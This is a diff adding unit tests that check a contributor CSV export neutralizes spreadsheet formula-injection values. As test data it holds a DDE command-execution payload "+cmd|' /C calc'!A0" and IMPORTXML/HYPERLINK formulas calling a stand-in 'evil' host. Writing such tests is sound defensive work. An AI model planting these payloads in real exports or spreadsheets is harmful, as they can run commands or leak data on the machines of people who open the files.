@@ -106,6 +106,56 @@ describe("csv-export", () => {
     expect(csv).toContain('"no"');
   });
 
+  it("neutralizes formula payloads in usernames, notes and debug fields", () => {
+    const contributor: ContributorRow = {
+      ...mockContributors[0],
+      githubUsername: '=IMPORTXML("http://evil")',
+      stellarAddress: "-=cmd",
+      xlmBalance: "-12.5",
+      spendableXlmBalance: "+3.25",
+      horizonDebug: {
+        summary: "@SUM(1,2) malicious note",
+        nextAction: "+cmd|' /C calc'!A0",
+        checkpoints: [],
+        warnings: [],
+      },
+      walletProof: {
+        provider: "Freighter",
+        method: "signMessage",
+        challenge: "\t=HYPERLINK(\"http://evil\")",
+        instructions: [],
+        fallback: "",
+      },
+    };
+
+    const csv = buildContributorsCsv([contributor]);
+    expect(csv).toContain(`"'=IMPORTXML(""http://evil"")"`);
+    expect(csv).toContain(`"'@SUM(1,2) malicious note"`);
+    expect(csv).toContain(`"'+cmd|' /C calc'!A0"`);
+    expect(csv).toContain(`"'\t=HYPERLINK(""http://evil"")"`);
+    expect(csv).toContain('"-12.5"');
+    expect(csv).toContain('"+3.25"');
+    expect(csv).not.toContain('"=IMPORTXML');
+    expect(csv).not.toContain('"@SUM');
+  });
+
+  it("handles null and undefined formula-adjacent values", () => {
+    const contributor = {
+      ...mockContributors[0],
+      githubUsername: undefined,
+      horizonDebug: {
+        summary: null,
+        nextAction: undefined,
+        checkpoints: [],
+        warnings: [],
+      },
+    } as unknown as ContributorRow;
+
+    const csv = buildContributorsCsv([contributor]);
+    expect(csv).toContain('"","');
+    expect(csv).toContain('"","","');
+  });
+
   it("derives debug and proof fields when they are missing on the row", () => {
     const csv = buildContributorsCsv([
       {
